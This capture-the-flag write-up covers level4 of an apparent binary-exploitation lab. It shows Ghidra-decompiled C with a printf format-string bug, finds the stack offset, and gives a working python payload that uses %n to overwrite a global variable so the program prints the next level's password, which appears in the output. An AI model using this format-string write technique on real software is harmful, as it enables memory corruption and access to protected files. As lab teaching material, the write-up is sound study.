get the binary on host
* `scp -P 4242 level4@192.168.56.107:./level4 ./binary/level4`

decompile using ghidra
```
	unsigned int m;

	void main(void)
	{
		n();
	return;
	}

	void n(void)
	{
		undefined local_20c [520];
		
		fgets(local_20c,512,stdin);
		p(local_20c);
		if (m == 16930116) {
			system("/bin/cat /home/user/level5/.pass");
		}
		return;
	}

	void p(undefined4 param_1)
	{
		printf(param_1);
		return;
	}

```

addr of m => 0x08049810\
We need to find the offset, by trying (`python -c "print '\x10\x98\x04\x08' + '%x ' * 12" > /tmp/exploit_4; cat /tmp/exploit_4 | ./level4`), we can find it's 12.\
We now need to set m to 16 930 116. To do this we will again use %n so here `%12$n` but before we need printf to print 16930166 char but we can only intput 520.

We will use printf width option and do this\
`python -c "print '\x10\x98\x04\x08' + '%16930112c' + '%12\$n'" > /tmp/exploit_4; cat /tmp/exploit_4 | ./level4`
```
	[...]
	                                                             �
	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```